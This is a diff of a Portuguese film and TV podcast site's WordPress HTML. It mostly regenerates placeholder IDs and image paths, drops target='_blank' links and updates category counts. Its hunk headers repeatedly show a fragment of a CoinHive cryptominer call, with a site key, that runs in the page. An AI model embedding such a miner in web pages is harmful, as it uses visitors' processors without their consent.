-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80510d5da" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e7486217" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80510d5da' ).animateSvg();
+                $( '#59bd5e7486217' ).animateSvg();
               });
-            } else { $( '#59bb80510d5da' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e7486217' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Podcast #62: Guardiões da Galáxia – A Áudio-crítica" data-hu-post-id="59bb80510d5da" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Podcast #62: Guardiões da Galáxia – A Áudio-crítica" data-hu-post-id="59bd5e7486217" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -446,7 +493,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/6216" rel="bookmark" title="Podcast #62: Guardiões da Galáxia – A Áudio-crítica" target="_blank">Podcast #62: Guardiões da Galáxia – A Áudio-crítica</a>
+			<a href="/archives/6216" rel="bookmark" title="Podcast #62: Guardiões da Galáxia – A Áudio-crítica">Podcast #62: Guardiões da Galáxia – A Áudio-crítica</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -459,18 +506,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5348" title="Drops#12 – A série dos Titãs e a “DCFlix”">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb805111951" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e7491870" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb805111951' ).animateSvg();
+                $( '#59bd5e7491870' ).animateSvg();
               });
-            } else { $( '#59bb805111951' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e7491870' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Drops#12 – A série dos Titãs e a “DCFlix”" data-hu-post-id="59bb805111951" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Drops#12 – A série dos Titãs e a “DCFlix”" data-hu-post-id="59bd5e7491870" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -486,7 +533,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5348" rel="bookmark" title="Drops#12 – A série dos Titãs e a “DCFlix”" target="_blank">Drops#12 – A série dos Titãs e a “DCFlix”</a>
+			<a href="/archives/5348" rel="bookmark" title="Drops#12 – A série dos Titãs e a “DCFlix”">Drops#12 – A série dos Titãs e a “DCFlix”</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -499,18 +546,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5357" title="Drops #12: A série dos Titãs e a DCFlix">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb805115093" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e749fad0" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb805115093' ).animateSvg();
+                $( '#59bd5e749fad0' ).animateSvg();
               });
-            } else { $( '#59bb805115093' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e749fad0' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Drops #12: A série dos Titãs e a DCFlix" data-hu-post-id="59bb805115093" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Drops #12: A série dos Titãs e a DCFlix" data-hu-post-id="59bd5e749fad0" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -526,7 +573,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5357" rel="bookmark" title="Drops #12: A série dos Titãs e a DCFlix" target="_blank">Drops #12: A série dos Titãs e a DCFlix</a>
+			<a href="/archives/5357" rel="bookmark" title="Drops #12: A série dos Titãs e a DCFlix">Drops #12: A série dos Titãs e a DCFlix</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -539,18 +586,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5000" title="PodCast#61 – Falando de Trailers e Elencos">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb805118d54" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e74b36a2" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb805118d54' ).animateSvg();
+                $( '#59bd5e74b36a2' ).animateSvg();
               });
-            } else { $( '#59bb805118d54' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e74b36a2' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="PodCast#61 – Falando de Trailers e Elencos" data-hu-post-id="59bb805118d54" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="PodCast#61 – Falando de Trailers e Elencos" data-hu-post-id="59bd5e74b36a2" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -566,7 +613,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5000" rel="bookmark" title="PodCast#61 – Falando de Trailers e Elencos" target="_blank">PodCast#61 – Falando de Trailers e Elencos</a>
+			<a href="/archives/5000" rel="bookmark" title="PodCast#61 – Falando de Trailers e Elencos">PodCast#61 – Falando de Trailers e Elencos</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -579,18 +626,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5146" title="PodCast #61: Falando de Trailers e Elencos">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb80511cafa" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e74c03e1" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb80511cafa' ).animateSvg();
+                $( '#59bd5e74c03e1' ).animateSvg();
               });
-            } else { $( '#59bb80511cafa' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e74c03e1' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="PodCast #61: Falando de Trailers e Elencos" data-hu-post-id="59bb80511cafa" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="PodCast #61: Falando de Trailers e Elencos" data-hu-post-id="59bd5e74c03e1" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -606,7 +653,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5146" rel="bookmark" title="PodCast #61: Falando de Trailers e Elencos" target="_blank">PodCast #61: Falando de Trailers e Elencos</a>
+			<a href="/archives/5146" rel="bookmark" title="PodCast #61: Falando de Trailers e Elencos">PodCast #61: Falando de Trailers e Elencos</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -619,18 +666,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/4868" title="Drops #11 – Punho de Ferro, valeu?">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb8051202fc" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e74ccf6b" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb8051202fc' ).animateSvg();
+                $( '#59bd5e74ccf6b' ).animateSvg();
               });
-            } else { $( '#59bb8051202fc' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e74ccf6b' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Drops #11 – Punho de Ferro, valeu?" data-hu-post-id="59bb8051202fc" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Drops #11 – Punho de Ferro, valeu?" data-hu-post-id="59bd5e74ccf6b" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -646,7 +693,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4868" rel="bookmark" title="Drops #11 – Punho de Ferro, valeu?" target="_blank">Drops #11 – Punho de Ferro, valeu?</a>
+			<a href="/archives/4868" rel="bookmark" title="Drops #11 – Punho de Ferro, valeu?">Drops #11 – Punho de Ferro, valeu?</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -675,7 +722,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3993" rel="bookmark" title="Drops#10 – Punho de Ferro: A Prévia" target="_blank">Drops#10 – Punho de Ferro: A Prévia</a>
+			<a href="/archives/3993" rel="bookmark" title="Drops#10 – Punho de Ferro: A Prévia">Drops#10 – Punho de Ferro: A Prévia</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -704,7 +751,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4006" rel="bookmark" title="Drops #10: Punho de Ferro – A Prévia" target="_blank">Drops #10: Punho de Ferro – A Prévia</a>
+			<a href="/archives/4006" rel="bookmark" title="Drops #10: Punho de Ferro – A Prévia">Drops #10: Punho de Ferro – A Prévia</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -733,7 +780,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2287" rel="bookmark" title="Drops#09 – Falando de La La Land" target="_blank">Drops#09 – Falando de La La Land</a>
+			<a href="/archives/2287" rel="bookmark" title="Drops#09 – Falando de La La Land">Drops#09 – Falando de La La Land</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -762,7 +809,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2481" rel="bookmark" title="Drops #09: Falando de La La Land" target="_blank">Drops #09: Falando de La La Land</a>
+			<a href="/archives/2481" rel="bookmark" title="Drops #09: Falando de La La Land">Drops #09: Falando de La La Land</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -791,7 +838,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2078" rel="bookmark" title="PodCast #60: Os Melhores e as DCpções de 2016" target="_blank">PodCast #60: Os Melhores e as DCpções de 2016</a>
+			<a href="/archives/2078" rel="bookmark" title="PodCast #60: Os Melhores e as DCpções de 2016">PodCast #60: Os Melhores e as DCpções de 2016</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -820,7 +867,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/1419" rel="bookmark" title="Podcast#59 – Rogue One: O que achamos…" target="_blank">Podcast#59 – Rogue One: O que achamos…</a>
+			<a href="/archives/1419" rel="bookmark" title="Podcast#59 – Rogue One: O que achamos…">Podcast#59 – Rogue One: O que achamos…</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -849,7 +896,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/671" rel="bookmark" title="Podcast#58 – O Top 5 Marvel Studios" target="_blank">Podcast#58 – O Top 5 Marvel Studios</a>
+			<a href="/archives/671" rel="bookmark" title="Podcast#58 – O Top 5 Marvel Studios">Podcast#58 – O Top 5 Marvel Studios</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -878,7 +925,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/790" rel="bookmark" title="PodCast #58: O Top 5 Marvel Studios" target="_blank">PodCast #58: O Top 5 Marvel Studios</a>
+			<a href="/archives/790" rel="bookmark" title="PodCast #58: O Top 5 Marvel Studios">PodCast #58: O Top 5 Marvel Studios</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -953,7 +1000,7 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-36"><a href="/archives/category/cine-alerta-series" >Cine Alerta (Séries)</a> (38)
 </li>
-	<li class="cat-item cat-item-2"><a href="/archives/category/cinema" >Cinema</a> (1,837)
+	<li class="cat-item cat-item-2"><a href="/archives/category/cinema" >Cinema</a> (1,841)
 </li>
 	<li class="cat-item cat-item-8"><a href="/archives/category/cinema-em-cena" >Cinema em Cena</a> (10)
 </li>
@@ -963,13 +1010,13 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-32"><a href="/archives/category/cinema-em-serie-series" >Cinema em Série (Séries)</a> (3)
 </li>
-	<li class="cat-item cat-item-40"><a href="/archives/category/cinema-no-escurinho" >Cinema no escurinho</a> (10)
+	<li class="cat-item cat-item-40"><a href="/archives/category/cinema-no-escurinho" >Cinema no escurinho</a> (11)
 </li>
 	<li class="cat-item cat-item-38"><a href="/archives/category/criticos-com" >Críticos.com</a> (94)
 </li>
 	<li class="cat-item cat-item-11"><a href="/archives/category/estante-da-sala" >Estante da Sala</a> (40)
 </li>
-	<li class="cat-item cat-item-39"><a href="/archives/category/filmes-classicos" >Filmes Clássicos</a> (42)
+	<li class="cat-item cat-item-39"><a href="/archives/category/filmes-classicos" >Filmes Clássicos</a> (43)
 </li>
 	<li class="cat-item cat-item-10"><a href="/archives/category/filmes-do-chico" >Filmes do Chico</a> (24)
 </li>
@@ -977,7 +1024,7 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-25"><a href="/archives/category/meus-2-centavos" >Meus 2 Centavos</a> (128)
 </li>
-	<li class="cat-item cat-item-18"><a href="/archives/category/mix-de-series" >Mix de Séries</a> (1,336)
+	<li class="cat-item cat-item-18"><a href="/archives/category/mix-de-series" >Mix de Séries</a> (1,339)
 </li>
 	<li class="cat-item cat-item-26"><a href="/archives/category/nerd-rabugento" >Nerd Rabugento</a> (96)
 </li>
@@ -991,11 +1038,11 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-24"><a href="/archives/category/pipocando" >Pipocando</a> (192)
 </li>
-	<li class="cat-item cat-item-21"><a href="/archives/category/plano-critico-cinema" >Plano Crítico (Cinema)</a> (770)
+	<li class="cat-item cat-item-21"><a href="/archives/category/plano-critico-cinema" >Plano Crítico (Cinema)</a> (773)
 </li>
 	<li class="cat-item cat-item-20"><a href="/archives/category/plano-critico-series" >Plano Crítico (Séries)</a> (419)
 </li>
-	<li class="cat-item cat-item-6"><a href="/archives/category/podcast" >Podcast</a> (220)
+	<li class="cat-item cat-item-6"><a href="/archives/category/podcast" >Podcast</a> (221)
 </li>
 	<li class="cat-item cat-item-22"><a href="/archives/category/pop-series" >Pop Séries</a> (34)
 </li>
@@ -1003,11 +1050,11 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-13"><a href="/archives/category/razao-de-aspecto" >Razão de Aspecto</a> (177)
 </li>
-	<li class="cat-item cat-item-17"><a href="/archives/category/serie-maniacos" >Série Maníacos</a> (1,948)
+	<li class="cat-item cat-item-17"><a href="/archives/category/serie-maniacos" >Série Maníacos</a> (1,956)
 </li>
 	<li class="cat-item cat-item-34"><a href="/archives/category/serie-maniacos-podcast" >Série Maníacos (Podcast)</a> (69)
 </li>
-	<li class="cat-item cat-item-16"><a href="/archives/category/series" >Séries</a> (3,864)
+	<li class="cat-item cat-item-16"><a href="/archives/category/series" >Séries</a> (3,875)
 </li>
 	<li class="cat-item cat-item-15"><a href="/archives/category/viagem-pelo-cinema" >Viagem pelo Cinema</a> (9)
 </li>
@@ -1016,19 +1063,19 @@ var wid = '288202';
 		</ul>
 </div>		<div id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widget-title">Publicações recentes</h3>		<ul>
 					<li>
-				<a href="/archives/7737">Crítica | Réquiem para um Sonho</a>
+				<a href="/archives/7751">Crítica | Amityville: O Despertar</a>
 						</li>
 					<li>
-				<a href="/archives/7730">Audiência USA – 12/09/17: Terça</a>
+				<a href="/archives/7745">Stitchers é cancelado depois de 3 temporadas pelo Freeform</a>
 						</li>
 					<li>
-				<a href="/archives/7729">Audiência USA – 11/09/17: Segunda</a>
+				<a href="/archives/7744">Kidding: Jim Carrey vai estrelar nova série do Showtime</a>
 						</li>
 					<li>
-				<a href="/archives/7728">Audiência USA – 10/09/17: Domingo</a>
+				<a href="/archives/7753">&quot;Feito na América&quot; e embalado sob medida para o talento de Tom Cruise</a>
 						</li>
 					<li>
-				<a href="/archives/7727">Masterchef Profissionais 2×02: Top 13</a>
